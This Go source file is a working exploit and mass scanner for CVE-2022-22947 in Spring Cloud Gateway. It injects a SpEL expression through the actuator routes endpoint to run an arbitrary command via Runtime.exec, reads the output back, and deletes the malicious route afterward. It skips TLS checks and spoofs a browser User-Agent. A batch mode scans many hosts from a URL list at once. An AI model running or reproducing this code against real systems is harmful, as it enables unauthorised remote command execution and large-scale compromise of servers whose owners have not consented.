package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func RandString(len int) string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		b := r.Intn(26) + 65
		bytes[i] = byte(b)
	}
	return string(bytes)
}

func exec(targetURL, runCommand string, isbatch bool) {
	randStr := RandString(5)

	if isbatch {
		runCommand = "id"

	} else {
		if runCommand == "" {
			fmt.Println("请输入您要执行的命令")
			return
		}
	}

	PostData := `{
      "id": "` + randStr + `",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"` + runCommand + `\"}).getInputStream()))}"}
        }],
      "uri": "http://example.com",
      "order": 0
    }`

	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(targetURL, "http") {
		targetURL = "http://" + targetURL
	}

	request1, err := http.NewRequest(http.MethodPost, targetURL+"/actuator/gateway/routes/"+randStr, strings.NewReader(PostData))
	if err != nil {
		fmt.Println(err)
	}
	request1.Header.Add("Content-Type", "application/json")
	request1.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	request1.Header.Add("Accept-Language", "en")
	request1.Header.Add("Accept-Encoding", "gzip, deflate")
	request1.Header.Add("Accept", "*/*")
	do1, err := cli.Do(request1)
	if err != nil {
		return
	}

	request2, err := http.NewRequest(http.MethodPost, targetURL+"/actuator/gateway/refresh", nil)
	request2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request2.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	if err != nil {
		fmt.Println(err)
	}
	do2, err := cli.Do(request2)

	request3, err := http.NewRequest(http.MethodGet, targetURL+"/actuator/gateway/routes/"+randStr, nil)
	request3.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request3.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	if err != nil {
		fmt.Println(err)
	}
	do3, err := cli.Do(request3)

	request4, err := http.NewRequest(http.MethodDelete, targetURL+"/actuator/gateway/routes/"+randStr, nil)
	request4.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request4.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	do4, err := cli.Do(request4)
	if err != nil {
		fmt.Println(err)
	}

	request5, err := http.NewRequest(http.MethodGet, targetURL+"/actuator/gateway/routes/"+randStr, nil)
	request5.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request5.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	do5, err := cli.Do(request5)
	if err != nil {
		fmt.Println(err)
	}

	defer func() {
		_ = do1.Body.Close()
		_ = do2.Body.Close()
		_ = do3.Body.Close()
		_ = do4.Body.Close()
		_ = do5.Body.Close()
	}()

	gread, err4 := ioutil.ReadAll(do3.Body)
	if err4 == nil {
		if isbatch {
			if strings.Contains(string(gread), "uid=") {
				fmt.Printf("%s 存在漏洞\n", targetURL)
			}
		} else {
			fmt.Println(Between(string(gread), "AddResponseHeader Result =", "],"))
		}
	}
}

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func main() {
	var wg sync.WaitGroup

	var targetURL, runCommand, filepath string

	flag.StringVar(&targetURL, "u", "", "")
	flag.StringVar(&filepath, "l", "", "")
	flag.StringVar(&runCommand, "c", "", "")
	flag.CommandLine.Usage = func() {
		fmt.Println("使用说明：\n执行命令：./CVE-2022-22947 -u http://127.0.0.1:8080 -c whoami\n批量检测：./CVE-2022-22947 -l url.txt ")
	}

	flag.Parse()

	if len(targetURL) == 0 {

		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
		if err != nil {
			fmt.Println("Open file error!", err)
			return
		}
		defer file.Close()
		buf := bufio.NewReader(file)
		for {
			wg.Add(1)
			line, err := buf.ReadString('\n')
			line = strings.TrimSpace(line)
			a := line
			go func() {
				exec(a, "echo test", true)
				wg.Done()
			}()
			if err != nil {
				if err == io.EOF {
					break
				} else {
					fmt.Println("Read file error!", err)
					return
				}
			}
		}
	} else {
		exec(targetURL, runCommand, false)
	}
	wg.Wait()
}
